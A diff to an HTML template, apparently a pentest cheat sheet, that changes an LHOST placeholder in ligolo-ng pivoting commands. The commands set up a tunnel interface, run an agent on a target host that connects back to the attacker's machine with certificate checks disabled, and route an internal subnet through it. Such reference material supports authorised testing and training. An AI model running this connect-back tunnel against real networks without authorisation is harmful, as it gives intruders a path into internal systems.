@@ -12,7 +12,7 @@
     <div class="cmd" data-tpl="sudo ip tuntap add user root mode tun ligolo"></div>
     <div class="cmd" data-tpl="sudo ip link set ligolo up"></div>
     <div class="cmd" data-tpl="sudo ./proxy -selfcert"></div>
-    <div class="cmd" data-tpl="./agent -connect {% raw %}{{LHOST}}{% endraw %}:11601 -ignore-cert &"><span class="lbl">on target</span></div>
+    <div class="cmd" data-tpl="./agent -connect $LHOST:11601 -ignore-cert &"><span class="lbl">on target</span></div>
     <div class="cmd" data-tpl="session"></div>
     <div class="cmd" data-tpl="start"></div>
     <div class="cmd" data-tpl="sudo ip route add 172.16.1.0/24 dev ligolo"><span class="lbl">add route</span></div>
